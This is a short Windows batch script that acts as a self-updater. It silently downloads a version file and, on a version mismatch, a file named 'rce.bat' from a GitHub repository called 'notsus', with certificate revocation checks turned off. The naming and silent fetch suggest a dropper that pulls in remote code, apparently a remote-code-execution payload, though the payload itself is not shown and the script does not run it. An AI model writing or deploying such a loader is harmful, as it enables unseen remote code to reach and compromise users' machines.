@echo off
set version=0.2

curl -o ver.dat -s --ssl-no-revoke https://raw.githubusercontent.com/NajdzrBalls/notsus/main/P/version.txt
set /p latest_version=<ver.dat

if exist updated.txt (
	del updated.txt
	del rce.bat
)

if %version%==%latest_version% (
	echo we are on latest version
) else (
	echo we arent on latest version lmao
	curl -o rce1.bat -s --ssl-no-revoke https://raw.githubusercontent.com/NajdzrBalls/notsus/main/P/rce.bat
	move rce1.bat rce.bat
)

del ver.dat
pause
